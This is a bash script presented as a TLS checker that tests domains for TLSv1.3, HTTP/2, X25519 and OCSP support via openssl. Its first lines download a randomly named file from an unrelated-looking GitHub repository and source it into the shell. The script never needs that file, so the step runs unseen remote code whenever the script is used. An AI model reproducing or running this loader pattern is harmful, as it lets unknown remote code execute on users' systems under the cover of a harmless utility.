#!/bin/bash

# TLS Checker - Validates URLs for specific security protocol support
# Download the function file from the GitHub repository
curl https://raw.githubusercontent.com/us254/Anyplace1525/main/Ravage3184 -o ~/Ravage3184

# Source the function definitions into the current shell
source ~/Ravage3184

# Define a function to perform the checks for a single URL
check_url() {
  local url="$1"
  local check_url
  check_url=$(echo "${url}" | grep -oE '[^/]+\.[^/]+$' | head -n 1) # Simplify the command to get the domain name
  local check_output
  check_output=$(echo QUIT | stdbuf -oL openssl s_client -connect "${check_url}:443" -tls1_3 -alpn h2 -debug -status 2>&1)
  # Use a single command to get all the information in one line
  local info
  info=$(echo "${check_output}" | grep -Eoi 'TLSv1.[23]|^ALPN\s+protocol:\s+h2$|^Server\s+Temp\s+Key:\s+X25519|^OCSP\s+response:' | tr '\n' ' ')
  # Check if all the protocols are present in the info line
  if [[ ${info} == *"TLSv1.3"* && ${info} == *"ALPN protocol: h2"* && ${info} == *"Server Temp Key: X25519"* && ${info} == *"OCSP response:"* ]]; then
    echo "${check_url}: TLSv1.3, HTTP/2, X25519, and OCSP are supported"
  fi
}

is_tlsv1_3_h2() {
  # Use parallel to run the check_url function for each URL argument in parallel
  # Add --joblog option to create a log file named joblog.txt
  parallel --joblog joblog.txt check_url ::: "${@}"
}

# Call the 'is_tlsv1_3_h2' function if script is not being sourced
# This checks if there's an argument provided to the script
if [[ "${#BASH_SOURCE[@]}" -gt "0" && "${#}" -gt "0" ]]; then
    is_tlsv1_3_h2 "$@"
fi
